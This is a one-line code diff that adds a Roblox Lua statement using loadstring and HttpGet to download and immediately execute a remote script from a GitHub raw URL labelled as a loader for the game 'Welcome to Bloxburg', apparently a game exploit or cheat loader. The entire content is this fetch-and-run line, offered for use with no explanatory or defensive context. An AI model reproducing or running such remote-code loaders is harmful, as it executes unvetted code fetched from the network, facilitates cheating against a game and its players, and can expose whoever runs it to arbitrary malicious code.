@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/welcome-to-bloxburg-spam7-f8vxprhbo547nx.lua"))()
